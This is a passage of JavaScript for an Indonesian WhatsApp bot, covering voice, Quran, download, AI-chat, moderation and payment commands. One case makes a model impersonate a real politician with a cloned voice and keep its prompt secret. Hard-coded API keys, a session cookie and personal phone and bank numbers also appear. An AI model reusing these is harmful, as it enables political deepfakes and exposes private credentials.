        "mt-MT-JosephNeural",
        "my-MM-NilarNeural",
        "my-MM-ThihaNeural",
        "nb-NO-FinnNeural",
        "nb-NO-IselinNeural",
        "nb-NO-PernilleNeural",
        "ne-NP-HemkalaNeural",
        "ne-NP-SagarNeural",
        "nl-BE-ArnaudNeural",
        "nl-BE-DenaNeural",
        "nl-NL-ColetteNeural",
        "nl-NL-FennaNeural",
        "nl-NL-MaartenNeural",
        "pl-PL-AgnieszkaNeural",
        "pl-PL-MarekNeural",
        "pl-PL-ZofiaNeural",
        "ps-AF-GulNawazNeural",
        "ps-AF-LatifaNeural",
        "pt-BR-AntonioNeural",
        "pt-BR-BrendaNeural",
        "pt-BR-DonatoNeural",
        "pt-BR-ElzaNeural",
        "pt-BR-FabioNeural",
        "pt-BR-FranciscaNeural",
        "pt-BR-GiovannaNeural",
        "pt-BR-HumbertoNeural",
        "pt-BR-JulioNeural",
        "pt-BR-LeilaNeural",
        "pt-BR-LeticiaNeural",
        "pt-BR-ManuelaNeural",
        "pt-BR-NicolauNeural",
        "pt-BR-ValerioNeural",
        "pt-BR-YaraNeural",
        "pt-PT-DuarteNeural",
        "pt-PT-FernandaNeural",
        "pt-PT-RaquelNeural",
        "ro-RO-AlinaNeural",
        "ro-RO-EmilNeural",
        "ru-RU-DariyaNeural",
        "ru-RU-DmitryNeural",
        "ru-RU-SvetlanaNeural",
        "si-LK-SameeraNeural",
        "si-LK-ThiliniNeural",
        "sk-SK-LukasNeural",
        "sk-SK-ViktoriaNeural",
        "sl-SI-PetraNeural",
        "sl-SI-RokNeural",
        "so-SO-MuuseNeural",
        "so-SO-UbaxNeural",
        "sq-AL-AnilaNeural",
        "sq-AL-IlirNeural",
        "sr-Latn-RS-NicholasNeural",
        "sr-Latn-RS-SophieNeural",
        "sr-RS-NicholasNeural",
        "sr-RS-SophieNeural",
        "su-ID-JajangNeural",
        "su-ID-TutiNeural",
        "sv-SE-HilleviNeural",
        "sv-SE-MattiasNeural",
        "sv-SE-SofieNeural",
        "sw-KE-RafikiNeural",
        "sw-KE-ZuriNeural",
        "sw-TZ-DaudiNeural",
        "sw-TZ-RehemaNeural",
        "ta-IN-PallaviNeural",
        "ta-IN-ValluvarNeural",
        "ta-LK-KumarNeural",
        "ta-LK-SaranyaNeural",
        "ta-MY-KaniNeural",
        "ta-MY-SuryaNeural",
        "ta-SG-AnbuNeural",
        "ta-SG-VenbaNeural",
        "te-IN-MohanNeural",
        "te-IN-ShrutiNeural",
        "th-TH-AcharaNeural",
        "th-TH-NiwatNeural",
        "th-TH-PremwadeeNeural",
        "tr-TR-AhmetNeural",
        "tr-TR-EmelNeural",
        "uk-UA-OstapNeural",
        "uk-UA-PolinaNeural",
        "ur-IN-GulNeural",
        "ur-IN-SalmanNeural",
        "ur-PK-AsadNeural",
        "ur-PK-UzmaNeural",
        "uz-UZ-MadinaNeural",
        "uz-UZ-SardorNeural",
        "vi-VN-HoaiMyNeural",
        "vi-VN-NamMinhNeural",
        "wuu-CN-XiaotongNeural",
        "wuu-CN-YunzheNeural",
        "yue-CN-XiaoMinNeural",
        "yue-CN-YunSongNeural",
        "zh-CN-XiaochenNeural",
        "zh-CN-XiaohanNeural",
        "zh-CN-XiaomengNeural",
        "zh-CN-XiaomoNeural",
        "zh-CN-XiaoqiuNeural",
        "zh-CN-XiaoruiNeural",
        "zh-CN-XiaoshuangNeural",
        "zh-CN-XiaoxiaoNeural",
        "zh-CN-XiaoxuanNeural",
        "zh-CN-XiaoyanNeural",
        "zh-CN-XiaoyiNeural",
        "zh-CN-XiaoyouNeural",
        "zh-CN-XiaozhenNeural",
        "zh-CN-YunfengNeural",
        "zh-CN-YunhaoNeural",
        "zh-CN-YunjianNeural",
        "zh-CN-YunxiNeural",
        "zh-CN-YunxiaNeural",
        "zh-CN-YunyangNeural",
        "zh-CN-YunyeNeural",
        "zh-CN-YunzeNeural",
        "zh-CN-henan-YundengNeural",
        "zh-CN-liaoning-XiaobeiNeural",
        "zh-CN-shaanxi-XiaoniNeural",
        "zh-CN-shandong-YunxiangNeural",
        "zh-CN-sichuan-YunxiNeural",
        "zh-HK-HiuGaaiNeural",
        "zh-HK-HiuMaanNeural",
        "zh-HK-WanLungNeural",
        "zh-TW-HsiaoChenNeural",
        "zh-TW-HsiaoYuNeural",
        "zh-TW-YunJheNeural",
        "zu-ZA-ThandoNeural",
        "zu-ZA-ThembaNeural"
    ]
    let lister = ListVoiceArray(ListVoice)
    let readMore = String.fromCharCode(8206).repeat(4001);

    let query = `Input query!\n\n*Example:*\n${prefix + command} [angka]|[teks]\n\n*Pilih angka yg ada*\n` + readMore + lister.map((v, index) => "  " + (index + 1) + ". " + v).join("\n");
    
    function getParts(array, index) {
    if (isNaN(index)) {
        index = Number(index);
        if (isNaN(index)) {
            return "Indeks harus berupa nomor";
        }
    }

    const text = array[index - 1];
    const language = getLanguage(text);
    return {
        short: language,
        long: text
    };
}

function getLanguage(text) {
    const parts = text.split("-");
    return parts.slice(0, 2).join("-");
}
            
async function generateVoice(Locale = "id-ID", Voice = "id-ID-ArdiNeural", Query) {
    const formData = new FormData();
    formData.append("locale", Locale);
    formData.append("content", `<voice name="${Voice}">${Query}</voice>`);
    formData.append("ip", '46.161.194.33');
    const response = await fetch('https://app.micmonster.com/restapi/create', {
        method: 'POST',
        body: formData
    });
    return Buffer.from(('data:audio/mpeg;base64,' + await response.text()).split(',')[1], 'base64');
};
    
    let text
    if (args.length >= 1) {
        text = args.slice(0).join(" ")
    } else if (m.quoted && m.quoted.text) {
        text = m.quoted.text
    } else return m.reply(query)
    let [atas, bawah] = text.split("|")
    if (!atas) return m.reply(query)
    if (!bawah) return m.reply(query)
    const {
        short,
        long
    } = getParts(ListVoice, atas);
    await m.reply(mess.wait + "\n" + long.replace(/(.+)-(.+)-(.+)Neural/, "$3 ($1-$2)"))

    try {
        let res = await generateVoice(short, long, bawah)
        if (res) await KhaerulZx.sendMessage(m.chat, {
        audio: res,
        mimetype: 'audio/mp4',
        ptt: true,
        waveform: [100, 0, 100, 0, 100, 0, 100]
    }, {
        quoted: m
    })
    } catch (e) {
        await m.reply(e)
    }
}
break
/*Credit : Lenwy Si Pemula
https://whatsapp.com/channel/0029VaGdzBSGZNCmoTgN2K0u
*/
case 'surah': {
         if (banned.includes(m.sender)) {
    return;
    }
  if (!q) return reply("🔍 *Masukkan Nomor Surah*\n\n*contoh : .surah 15*");
  try {
    let gd = await fetchJson(`https://api-lenwy.vercel.app/surah?search=${q}`);
    
    if (gd && gd.hasil && gd.hasil.length > 0) {
      let result = `🔍 *Surah Ke : ${q}*`;
      
      gd.hasil.forEach((hasil, index) => {
        result += `\n\n*Ayat ${index + 1}*\n\n`;
        result += `*${hasil.arab}*\n\n`
        result += `*${hasil.latin}*\n\n`;
        result += `_${hasil.indo}_\n\n==============================`;
      });

      reply(result);
    } else {
      reply("🔍 *Tidak Ada Hasil Yang Valid*");
    }
  } catch (error) {
    return reply(mess.error);
  }
}
break;
case 'ringtone':
    {
//wm senn
         if (banned.includes(m.sender)) {
    return;
    }
       async function RingTone(search) {
    return new Promise(async (resolve, reject) => {
        try {
            const { data } = await axios.get('https://meloboom.com/en/search/' + search)
//wm senn
            let $ = cheerio.load(data)
            let hasil = []
            $('#__next > main > section > div.jsx-2244708474.container > div > div > div > div:nth-child(4) > div > div > div > ul > li').each(function (a, b) {
//wm senn
                hasil.push({
                    title: $(b).find('h4').text(), 
                    source: 'https://meloboom.com/' + $(b).find('a').attr('href'), 
                    audio: $(b).find('audio').attr('src')
                })
            })
//wm senn
            resolve(hasil)
        } catch (err) {
            console.error(err)
            return []
//wm senn
        }
    })
}
//wm senn
//wm senn
 if(!text) return m.reply('```🚩 Input query??```')
  let yapit = await RingTone(text)
//wm senn
  let src = pickRandom(yapit)
  let txt = `RINGTONE
❃ Title : ${src.title}
❃ Source : ${src.source}
  
_wait sending audio_`
//wm senn
  let ngawur = await KhaerulZx.sendMessage(m.chat,{text: txt,mentions:[m.sender]},{quoted:m})
  await sleep(3000)
   //wm senn
 KhaerulZx.sendMessage(m.chat, {
        audio: {
        	url: src.audio
        },
//wm senn
        mimetype: "audio/mpeg",
        ptt: true
        }, {
        	quoted: ngawur
        })
 //wm senn         KhaerulZx.sendMessage(m.chat, { react: { text: '✅', key: m.key }})
          }
//wm senn
          break
          /**
 * 
 * [ *CASE GPT4* ]
 * https://whatsapp.com/channel/0029Vaf07jKCBtxAsekFFk3i
 */

case 'a2i': {
         if (banned.includes(m.sender)) {
    return;
    }
  if (!text) return m.reply(`Hai, apa yang ingin saya bantu?`)
async function openai(text, logic) { // Membuat fungsi openai untuk dipanggil
    let response = await axios.post("https://chateverywhere.app/api/chat/", {
        "model": {
            "id": "gpt-4",
            "name": "GPT-4",
            "maxLength": 32000,  // Sesuaikan token limit jika diperlukan
            "tokenLimit": 8000,  // Sesuaikan token limit untuk model GPT-4
            "completionTokenLimit": 5000,  // Sesuaikan jika diperlukan
            "deploymentName": "gpt-4"
        },
        "messages": [
            {
                "pluginId": null,
                "content": text, 
                "role": "user"
            }
        ],
        "prompt": logic, 
        "temperature": 0.5
    }, { 
        headers: {
            "Accept": "/*/",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
        }
    });
    
    let result = response.data;
    return result;
}

let erul = await openai(text, "kamu adalah ai, kamu adalah asisten kecerdasan buatan yang sering membantu orang lain jika ada yang ditanyakan")
m.reply(erul)
}
break
case 'ai2': {
         if (banned.includes(m.sender)) {
    return;
    }
 if (!text) return reply(`Contoh:\n${prefix + command} Berikan Saya Lagu Forever Young\n${prefix + command} Gambar Kan Wanita Jelek\n${prefix + command} Hai, Siapa Nama Mu`);
 try {
 if (text.includes('putar') || text.includes('musik') || text.includes('berikan musik')) {
 m.reply(`Wahhh, Jadi Anda Ingin Memutar Musik ${text} Ya, Oke Bentar Saya Cari..`);
 let api = await fetchJson(`https://api.agatz.xyz/api/ytplay?message=${text}`);
 let title = api.data.title;
 let thumb = api.data.thumb;
 let mp3 = api.data.url.url;
 await KhaerulZx.sendMessage(m.chat, {
 audio: { url: mp3 },
 fileName: title + '.mp3',
 mimetype: 'audio/mpeg',
 contextInfo: {
 externalAdReply: {
 title: title,
 body: `${pushname}`,
 thumbnailUrl: `${global.thumbnail}`,
 sourceUrl: `${global.idsal}`,
 mediaType: 1,
 showAdAttribution: false,
 renderLargerThumbnail: true
 }
 },
 }, { quoted: m });
 } else if (text.includes('gambarkan') || text.startsWith('gambar') || text.includes('berikan gambar') || text.includes('gambarkan untuk ku')) {
 reply(`Waahhh Jadi Kamu Ingin Membuat Foto ${text} ya, Oke Bentar Bang...`);
 let api = await fetchJson(`https://widipe.com/v6/text2img?text=${text}`);
 let foto = api.result.url;
 await KhaerulZx.sendMessage(m.chat, { image: { url: foto }, caption: 'Ini Hasil Foto Yang Finsii Buat😄' }, { quoted: m });
 m.reply(`Selanjutnya Kamu Pengen Ngapain Nih Kak...`);
 } else if (text.includes('tutup group') || text.includes('tutup gc') || text.includes('tutup')) {
 if (!isBotAdmins) return reply("Yahhh YunShan Tidak Admin Group, Maaf Ya Kak");
 if (!isCreator && isAdmins) return reply("Yah Perintah Ini Cuman Bisa Di Lakukan Oleh Admins Dan Ownerss...");
 await KhaerulZx.groupSettingUpdate(m.chat, 'announcement');
 m.reply(`Berhasil Menutup Group Nih ${pushname}`);
 } else if (text.includes('buka group') || text.includes('buka gc') || text.includes('buka')) {
 if (!isBotAdmins) return reply("Jadikan Bot Admin Terlebih Dahulu");
 if (!isCreator && isAdmins) return reply("Kamu Bukan Admin");
 await KhaerulZx.groupSettingUpdate(m.chat, 'not_announcement');
 m.reply(`Sukses Membuka Group Nih ${pushname}`);
 } else if (text.includes('self') || text.includes('self kan') || text.includes('private kan bot')) {
 if (!isCreator) return reply("Khusus Owner");
 global.public = false;
 m.reply("Sukses");
 } else if (text.includes('public') || text.includes('public kan') || text.includes('public kan bot')) {
 if (!isCreator) return reply("Khusus Owner");
 global.public = true;
 m.reply("Sukses");
 } else if (text.includes('carikan saya gambar') || text.includes('carikan gambar') || text.includes('beri saya gambar')) {
 let api = await fetchJson(`https://api.kyuurzy.site/api/search/pinterest?query=${text}`);
 let foto = api.result;
 let c = 0;
 for (let ims of foto) {
 if (c == 0) await KhaerulZx.sendMessage(m.chat, { image: { url: ims }, caption: `Nihh Kak, Hasil Pencarian Dari ${text}\n\n${m.isGroup ? 'Foto Lainya Akan Di Kirim Di Private Chat...' : 'c'}` }, { quoted: m });
 else await KhaerulZx.sendMessage(m.sender, { image: { url: ims }}, { quoted: m });
 c += 4;
 await sleep(2000);
 }
 } else {
 const prompt = `Kamu Adalah ${global.botname},`
 let api = await fetchJson(`https://widipe.com//prompt/gpt?prompt=${prompt}&text=${text}`)
 let ress = api.result
 KhaerulZx.sendMessage(m.chat, {
 text: `${ress}`,
 contextInfo: {
 externalAdReply: {
 showAdAttribution: false,
 title: `Finsii - Ai`,
 body: ``,
 thumbnailUrl: `${global.thumbnail}`,
 sourceUrl: `https://whatsapp.com/channel/0029VaWA5U1EQIamnmeXRn2M`,
 mediaType: 1,
 renderLargerThumbnail: true }}});
 }
 } catch (e) {
 console.log(e);
 reply("Waduh Eror Nih");
 }
}
break;
 case 'aio2': {
          if (banned.includes(m.sender)) {
    return;
    }
  if (!text) return reply(`Example: ${prefix + command} link tt lu`)
async function aio(url){
	return new Promise(async(resolve,reject) => {
		
 const { data: rest } = await axios.get("https://steptodown.com/")
    const $ = cheerio.load(rest) 
    const tokens = $("input[name='token']").val()
    const data = new URLSearchParams(
      Object.entries({
        url: url,
        token: tokens 
      })
    )    
    await axios.post("https://steptodown.com/wp-json/aio-dl/video-data/", data, {
      headers: {
        "cookie": "PHPSESSID=658754a80bacc095aced0be8e110f3b4; pll_language=en",
        "user-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36"
      }
    })
    .then(( response ) => {
      resolve(response.data)
    })
    .catch((e) => {
      reject(e)
    })
  })
}
let sonice = await aio(text)
let wpol = `[ *AIO DOWNLOADER* ]

${sonice.title}

Durasi: ${sonice.duration}
Source: ${sonice.source}
Size: ${sonice.medias[0].formattedSize} || ${sonice.medias[0].size}
Quality: ${sonice.medias[0].quality}
MimeType: ${sonice.medias[0].extension}
`
await KhaerulZx.sendMessage(m.chat, { video: { url: sonice.medias[0].url }, caption: wpol }, { quoted: m })
}
break
case 'listpc': {
    if (!isCreator) return m.reply('Lu Siapa Kocak?');
    let annulistp = await store.chats.all()
        .filter(v => v.id.endsWith('.net') && !v.isGroup)
        .map(v => v.id);

    let teks = `*PERSONAL CHAT LIST*\n\nTotal Chat: ${anulistp.length} Chat\n\n`;

    for (let i of annulistp) {
        let lastMessage = store.messages[i] ? store.messages[i].array[0] : null;
        let nama = lastMessage ? lastMessage.pushName : 'Tanpa Nama'; // Cek apakah ada pesan
        teks += `*Name:* ${nama}\n*User:* @${i.split('@')[0]}\n*Chat:* https://wa.me/${i.split('@')[0]}\n\n────────────────────────\n\n`;
    }
    KhaerulZx.sendTextWithMentions(m.chat, teks, m);
}
break;
        /*     case 'listgc': {
             if (banned.includes(m.sender)) {
    return;
    }
             if (!isPrem && global.db.data.users[sender].limit < 1) return reply('Maaf Kak Limit Anda Habis Ingin Membeli Limit Ketik .buylimit')
             db.data.users[sender].limit -= 1 // -1 limit
                
let anulistg = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
let teks = `*[ Group Chat ]*
Total: ${anulistg.length} Group\n\n`
for (let i of anulistg) {
let metadata = await KhaerulZx.groupMetadata(i)
teks += `∘ *Name* : ${metadata.subject}
∘ *Owner* : ${metadata.owner !== undefined ? '@' + metadata.owner.split`@`[0] : 'Unknown'}
∘ *Id* : ${metadata.id}
∘ *Made* : ${moment(metadata.creation * 1000).tz('Asia/Kolkata').format('DD/MM/YYYY HH:mm:ss')}
∘ *Member* : ${metadata.participants.length}\n°°°°°°°°°°°°°°°°°°°°°°°°°°°°°\n`
}
KhaerulZx.sendTextWithMentions(m.chat, teks, m)
}
break */
case 'rules': {
reply(` _Rules FInsii AI_

- Don't Call Bot
- Don't Spam Bot
- Don't Culik Bot
- Don't Spam Owner
- Jangan mencari sesuatu yang berhubungan dengan pornografi 18+
- Jangan salahgunakan bot

Itulah Rules FInsii AI Kak Jangan Langgar Ya Kak`)
             await KhaerulZx.sendMessage(m.chat, {audio: fs.readFileSync('./Vn/rulesy.mp3'),mimetype: 'audio/mpeg',ptt: true}, {quoted:m})}
             break
             case 'formatneed': {
             if (banned.includes(m.sender)) {
    return;
    }
             reply(`*FORMAT NEED AKUN BY KYYXD*
_NOTE!!! : INI BUKAN 100% AKUN MILIK ADMIN ATAU KYY TETAPI AKUN MILIK SELER!!!_

LOG :
MC :
OP : 
SPEK :

_JANGAN LUPA SLALU MENGGUNAKAN JASA ADMIN KYYXD AGAR TERHINDAR DARI PENIPUAN ATAU MODUS LAINNY_`)
}
break
case 'formatjp': {
if (banned.includes(m.sender)) {
    return;
    }
reply(`*FORMAT JASA PSOT AKUN BY KYYXD*

_NOTE!!! : INI BUKAN 100% AKUN MILIK ADMIN ATAU KYY TETAPI AKUN MILIK SELER!!!_

LOG :
MC :
OP : 
SPEK :

_JANGAN LUPA SLALU MENGGUNAKAN JASA ADMIN KYYXD AGAR TERHINDAR DARI PENIPUAN ATAU MODUS LAINNY_`    )
}
break
case 'feerekber': {
if (banned.includes(m.sender)) {
    return;
    }
reply(`ALL FEE REKBER DI KYY HANYA 5K`)
}
break
case 'feegc': {
if (banned.includes(m.sender)) {
    return;
    }
reply(`langsung culik 62895392968503 / Finsii`)
}
break

case 'donate':
case 'pembayaran':
case 'payment':
case 'donasi': {
m.reply(`ɪɴɪ ᴀᴅᴀʟᴀʜ ᴍᴇᴛᴏᴅᴇ ᴘᴇᴍʙᴀʏᴀʀᴀɴ ${botname}\n\nᴅᴀɴᴀ : 0895392968503\nᴏᴠᴏ : 083112668264\nɢᴏᴘᴀʏ : 0895392968503\nsᴇᴀʙᴀɴᴋ : 901528413940\nǫʀɪs : https://e.top4top.io/p_3206t7bxn1.jpg`)
}
break
/*
  await KhaerulZx.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }});

  let msg = generateWAMessageFromContent(
    m.chat,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: `Berikut ini adalah metode pembayaran ${botname}`
            },
            nativeFlowMessage: {
              buttons: [
                {
                  "name": "cta_copy",
                  "buttonParamsJson": `{\"display_text\":\"Payment DANA\",\"copy_code\":\"Pay Dana : 083112668264\"}`
                },
                {
                  "name": "cta_copy",
                  "buttonParamsJson": `{\"display_text\":\"Payment OVO\",\"copy_code\":\"Pay Ovo : 083112668264\"}`
                },
                {
                "name": "cta_copy",
                  "buttonParamsJson": `{\"display_text\":\"Payment SeaBank\",\"copy_code\":\"Pay SeaBank : 901528413940\"}`
                },
                {
                  "name": "cta_copy",
                  "buttonParamsJson": `{\"display_text\":\"Payment GOPAY\",\"copy_code\":\"Pay Gopay : 0895392968503\"}`
                },
                {
  "name": "cta_url",
  "buttonParamsJson": `{"display_text":"QRIS","url":"https://e.top4top.io/p_3206t7bxn1.jpg"}`
},
                {
                        "name": "cta_url",
                        "buttonParamsJson": `{"display_text":"Dukung Bot Dengan Saweria","url":"https://saweria.co/khaerul0i","merchant_url":"https://www.google.com"}`
                      }
              ]
            },
            footer: {
              text: `Silakan pilih metode pembayaran yang tersedia.`
            }
          }
        }
      }
    },
    { quoted: fcall }
  );

  await KhaerulZx.relayMessage(msg.key.remoteJid, msg.message, {
    messageId: msg.key.id,
  });
}
break; */
case "autogempa": {
    if (banned.includes(m.sender)) {
        return;
    }

    if (args[0] === 'on') {
        autoGempaStatus = true;
        reply("Auto gempa diaktifkan. Bot akan mengirim notifikasi gempa ke semua grup.");
    } else if (args[0] === 'off') {
        autoGempaStatus = false;
        reply("Auto gempa dinonaktifkan.");
    } else {
        reply("Gunakan *autogempa on* untuk mengaktifkan atau *autogempa off* untuk menonaktifkan.");
    }
}
break;
case "gempa": {
if (banned.includes(m.sender)) {
    return;
    }
const link = 'https://data.bmkg.go.id/DataMKG/TEWS/'
try {
let res = await fetch(link+'autogempa.json')
let anu = await res.json()
anu = anu.Infogempa.gempa
let txt = `*── 「 GEMPA NEWS 」 ──*\n\n${anu.Wilayah}\n\n`
txt += `Potensi : ${anu.Potensi}\n`
txt += `Tanggal : ${anu.Tanggal}\n`
txt += `Waktu : ${anu.Jam}\n\n`
txt += `Magnitude : ${anu.Magnitude}\n`
txt += `Kedalaman : ${anu.Kedalaman}\n`
txt += `Koordinat : ${anu.Coordinates}${anu.Dirasakan.length > 3 ? `\nDirasakan : ${anu.Dirasakan}` : ''}`
await KhaerulZx.sendMessage(m.chat, { image: { url: link+anu.Shakemap }, caption: txt }, { quoted: m })
} catch (e) {
reply(mess.error.api)
}
}
break   
case 'afk': {
if (!m.isGroup) return reply('Khusus Group')
if (banned.includes(m.sender)) {
    return;
    }
let user = global.db.data.users[m.sender]
user.afkTime = + new Date
user.afkReason = text
await KhaerulZx.sendMessage(m.chat, { 
    text: `@${m.sender.split`@`[0]} Telah Afk Dengan Alasan ${text ? ': ' + text : ''}`, 
    mentions: [m.sender]
})
break;
}
                        case 'setsubject':
                        if (banned.includes(m.sender)) {
    return;
    }
                if (!isCreator) return reply('*Khusus Finsii Aja*')
if (!m.isGroup) return m.reply('ᴋʜᴜsᴜs ɢʀᴏᴜᴘ')
if (!isBotAdmins) return m.reply('ʙᴏᴛ ʙᴇʟᴜᴍ ᴀᴅᴍɪɴ')
if (!isAdmins) return m.reply('ᴋʜᴜsᴜs ᴀᴅᴍɪɴ ɢʀᴏup')
                if (!text) return reply('Text ?')
                await KhaerulZx.groupUpdateSubject(m.chat, text)
                reply(mess.done)
                break
                case 'invite': {
                if (banned.includes(m.sender)) {
    return;
    }
	if (!m.isGroup) return reply(`Fitur Khusus Group!\n\nSilahkan join grup bot : https://chat.whatsapp.com/Imb09rrEUGG2fylHNRXyQV`)
	if (!isBotAdmins) return reply(`finsii-ai belum admin`)
if (!text) return reply(`Enter the number you want to invite to the group\n\nExample :\n*${prefix + command}* 62895392968503`)
if (!text) return reply(`Enter the number together without *+*`)
if (!text) return reply(`Enter only the numbers plus your country code without spaces`)
let group = m.chat
let link = 'https://chat.whatsapp.com/' + await KhaerulZx.groupInviteCode(group)
      await KhaerulZx.sendMessage(text+'@s.whatsapp.net', {text: `≡ *GROUP INVITATION*\n\nA user invites you to join this group \n\n${link}`, mentions: [m.sender]})
        reply(` An invite link is sent to the user`) 
}
break
case 'ban': case 'banned': {
    if (!isCreator) return reply('Khusus Owner!');
    try {
        let users = m.mentionedJid[0] ? m.mentionedJid[0] 
                       : m.quoted ? m.quoted.sender 
                       : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
        if (users === ownerNumber) return reply('Owner tidak bisa di-banned!');
        if (users === botNumber) return reply('Maaf, Bot tidak bisa di-banned!');
        if (!m.mentionedJid[0] && !m.quoted && !text) 
            return m.reply(`Tag atau kutip pesan seseorang untuk melakukan ban!`);
        const isBan = banned.includes(users);
        if (isBan) return KhaerulZx.sendTextWithMentions(m.chat, `User sudah ada di daftar banned`, m);
        banned.push(users);
        fs.writeFileSync('./RulMedia/dbnye/banned.json', JSON.stringify(banned, null, 2));
        KhaerulZx.sendTextWithMentions(m.chat, `Sukses banned user. Pesan mereka akan dihapus secara otomatis.`, m);
    } catch (err) {
        m.reply(`Terjadi kesalahan, pastikan tag atau kutip pesan seseorang!`);
    }
}
break;

case 'message': {
    try {
        const sender = m.sender; // Ambil pengirim pesan
        if (banned.includes(sender)) {
            // Jika pengirim ada di daftar banned, hapus pesan
            await KhaerulZx.deleteMessage(m.chat, m.key);
            return; // Jangan proses pesan lebih lanjut
        }

        // Lanjutkan proses pesan seperti biasa jika pengirim tidak di-banned
    } catch (err) {
        console.log(`Error saat memproses pesan: ${err}`);
    }
}
break;

//=============================================//
case 'unban': {
    // Hanya owner yang bisa menggunakan fitur unban
    if (!isCreator) return reply('Khusus Owner!');
    
    try {
        // Mendapatkan user yang di-tag, di-quote, atau diinput langsung oleh teks
        let users = m.mentionedJid[0] ? m.mentionedJid[0] 
                   : m.quoted ? m.quoted.sender 
                   : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';

        // Jika tidak ada tag, quote, atau teks yang berisi user, kembalikan pesan kesalahan
        if (!m.mentionedJid[0] && !m.quoted && !text) 
            return m.reply(`Tag atau kutip pesan seseorang untuk melakukan unban!`);

        // Cek apakah user ada di dalam daftar banned
        const isBan = banned.includes(users);
        if (!isBan) return KhaerulZx.sendTextWithMentions(m.chat, `Target tidak ada dalam daftar banned`, m);

        // Hapus user dari daftar banned
        let index = banned.indexOf(users);
        banned.splice(index, 1); // Hapus user dari array

        // Simpan perubahan ke file banned.json
        fs.writeFileSync('./RulMedia/dbnye/banned.json', JSON.stringify(banned, null, 2));

        // Kirim pesan bahwa unban sukses
        KhaerulZx.sendTextWithMentions(m.chat, `Sukses unbanned user.`, m);

    } catch (err) {
        // Jika terjadi kesalahan, balas dengan pesan error
        m.reply(`Terjadi kesalahan, pastikan tag atau kutip pesan seseorang!`);
    }
}
break;
//=============================================//
case 'listban': {
let txt = `List user yang diban\nTotal: ${banned.length}\n\n`
for (let blk of banned) {
txt += `• ${blk.split('@')[0]}\n`
}
KhaerulZx.sendTextWithMentions(m.chat, txt, m)
}
break
case 'anticall': {
if (banned.includes(m.sender)) {
    return;
    }
if (!isCreator) return reply('Khusus Owner')
if (!args[0]) return m.reply(`Contoh: ${prefix+command} on/off`)
if (args[0] === 'on') {
global.anticall = true
await m.reply('Sukses mengaktifkan anticall.')
} else if (args[0] === 'off') {
global.anticall = false
await m.reply('Sukses menonaktifkan anticall.')
}}
break
 case 'simisimi': case 'simi':
 if (banned.includes(m.sender)) {
    return;
    }
if (!text) reply('What do u want to ask?')
let simi = await fetchJson(`https://aemt.me/simi?text=${text}`)
const simi2 = simi.result
KhaerulZx.sendMessage(m.chat, {text: simi2}, {quoted: m})
break
 //Powered By conn & Darwin
case 'd': case 'del': case 'delete': case 'hapus':
if (banned.includes(m.sender)) {
    return;
    }
if (!m.isGroup) return reply(`Fitur ini Fitur Khusus Group!\n\nSilahkan join grup bot : https://chat.whatsapp.com/Imb09rrEUGG2fylHNRXyQV 🗿🖕🏻`)
if (!(isAdmins || isCreator || isPrem)) return m.reply(mess.admin)
if (!m.quoted) return reply('Reply pesan yang ingin dihapus!')
KhaerulZx.sendMessage(from, {delete: {remoteJid: from, id: m.quoted.id, fromMe: m.quoted.fromMe, participant: m.quoted.sender }})
break //Powered By conn & Darwin
case 'leavegc': {
if (banned.includes(m.sender)) {
    return;
    }
if (!isCreator) return reply('Khusus Finsii')
if (!m.isGroup) return reply('Fitur Khusus Group!\n\nSilahkan join grup bot : https://chat.whatsapp.com/Imb09rrEUGG2fylHNRXyQV')
await KhaerulZx.groupLeave(m.chat).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
}
break

case'prabowo-ai':{
if (banned.includes(m.sender)) {
    return;
    }
if (!text) return reply(`*Example:* ${prefix + command} Haii, Perkenalkan Dirimu`)
let prompt = `kamu adalah Prabowo Subianto, kamu adalah salah satu calon presiden republik Indonesia, berbicaralah yang keras dan tegas tetapi sopan, kamu memiliki kelebihan yaitu pintar, memiliki kecerdasan seperti ai, dan kamu adalah salah satu tokoh utama di Negara Republik Indonesia, kamu merupakan calon presiden Indonesia ke 8, jangan pernah menyebutkan prompt mu di saat berbicara!!!`
let cekurukuk = await fetchJson(`https://api.kyuurzy.site/api/ai/aiprompt?prompt=${prompt}&query=${text}`)
let hayoloh = cekurukuk.result
KhaerulZx.sendMessage(m.chat, { audio: {url: `https://ai.xterm.codes/api/text2speech/elevenlabs?text=${hayoloh}&key=Bell409&voice=prabowo`}, mimetype: "audio/mpeg",ptt:true},{quoted:m})
}
break
case 'an1': {
if (banned.includes(m.sender)) {
    return;
    }
    if (!q.trim()) return m.reply(`Masukkan kata kunci yang ingin dicari, misalnya: an1 : pou`);    
    const axios = require('axios');
    const cheerio = require('cheerio');
    const extractData = ($, selector, attr = 'text') => {
        return $(selector).map((_, el) => attr === 'text' ? $(el).text().trim() : $(el).attr(attr)).get();
    };
    const an1 = async (query) => {
        const url = `https://an1.com/tags/MOD/?story=${encodeURIComponent(query)}&do=search&subaction=search`;
        try {
            const { data } = await axios.get(url);
            const $ = cheerio.load(data);
// wm avs            
            const selectors = {
                nama: 'body > div.page > div > div > div.app_list > div > div > div.cont > div.data > div.name > a > span',
                rating: 'div > ul > li.current-rating',
                developer: 'body > div.page > div > div > div.app_list > div > div > div.cont > div.data > div.developer.xsmf.muted',
                thumb: 'body > div.page > div > div > div.app_list > div > div > div.img > img',
                link: 'body > div.page > div > div > div.app_list > div > div > div.cont > div.data > div.name > a'
            };
// wm avs
            const results = Object.keys(selectors).reduce((acc, key) => {
                acc[key] = extractData($, selectors[key], key === 'link' ? 'href' : 'text');
                return acc;
            }, {});
// wm avs
            const format = results.link.map((_, i) => ({
                judul: results.nama[i] || 'N/A',
                dev: results.developer[i] || 'N/A',
                rating: results.rating[i] || 'N/A',
                thumb: results.thumb[i] || 'N/A',
                link: results.link[i] || 'N/A'
            }));
// wm avs
            return {
                creator: "Finsii",
                data: format
            };
        } catch (error) {
            throw new Error('Data retrieval failed');
        }
    };
// wm avs
    try {
        const result = await an1(q);

        if (result.data.length === 0) {
            m.reply('Tidak ada hasil.');
